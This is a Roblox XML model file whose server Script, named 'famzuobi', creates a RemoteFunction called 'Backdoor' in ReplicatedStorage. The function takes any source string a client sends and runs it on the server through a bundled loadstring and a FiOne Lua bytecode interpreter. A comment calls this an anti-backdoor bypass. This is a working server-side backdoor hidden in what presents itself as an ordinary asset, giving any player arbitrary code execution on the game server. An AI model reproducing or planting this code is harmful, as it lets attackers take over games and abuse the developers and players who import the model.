<roblox xmlns:xmime="http://www.w3.org/2005/05/xmlmime" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://www.roblox.com/roblox.xsd" version="4">
	...
	<Item class="Script" referent="RBX8D181FDCDEEA41AAB25DA670BEB0CDD1">
		<Properties>
			...
			<string name="Name">famzuobi</string>
			<token name="RunContext">0</token>
			<string name="ScriptGuid">{6234E219-83CD-494E-8B80-A44C40C7B2BE}</string>
			<ProtectedString name="Source"><![CDATA[local ReplicatedStorage = game:GetService("ReplicatedStorage")

local loadstring = require(script:WaitForChild("Loadstring"))
--反backdook绕过
local BackdoorRemote:RemoteFunction = ReplicatedStorage:FindFirstChild("Backdoor")
if not BackdoorRemote then
	BackdoorRemote = Instance.new("RemoteFunction")
	BackdoorRemote.Name = "Backdoor"
	BackdoorRemote.Parent = ReplicatedStorage
end

BackdoorRemote.OnServerInvoke = function(_, source)
	local executable, compileFailReason = loadstring(source)
	return compileFailReason and compileFailReason or executable()	
end]]></ProtectedString>
			<int64 name="SourceAssetId">-1</int64>
			<BinaryString name="Tags"></BinaryString>
		</Properties>
		<Item class="ModuleScript" referent="RBXF4E63B32CFFE4677B66AD254BEC8D266">
			<Properties>
				<BinaryString name="AttributesSerialize"></BinaryString>
				<SecurityCapabilities name="Capabilities">0</SecurityCapabilities>
				<bool name="DefinesCapabilities">false</bool>
				...
				<string name="ScriptGuid">{02CEA4AB-D635-4353-B560-9312F1E8A1B1}</string>
...
return function(source, env)
	...
	return nil, failureReason
			...
			<Item class="ModuleScript" referent="RBX1560007F2CF74F24A93FA0DB2723862A">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<SecurityCapabilities name="Capabilities">0</SecurityCapabilities>
					<bool name="DefinesCapabilities">false</bool>
					...
					<string name="ScriptGuid">{EE760145-4E08-4DF3-AB7A-7F7F3F6B66AC}</string>
					<ProtectedString name="Source"><![CDATA[--[[
FiOne
...
return function(bCode, env)
	return lua_wrap_state(lua_bc_to_state(bCode), env or getfenv(0))
			...
			<Item class="ModuleScript" referent="RBX482F412435C74C3D95DE3F330582966E">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<SecurityCapabilities name="Capabilities">0</SecurityCapabilities>
					<bool name="DefinesCapabilities">false</bool>
					...
					<string name="ScriptGuid">{6F112901-505C-4AF4-A501-CE1D12005A89}</string>
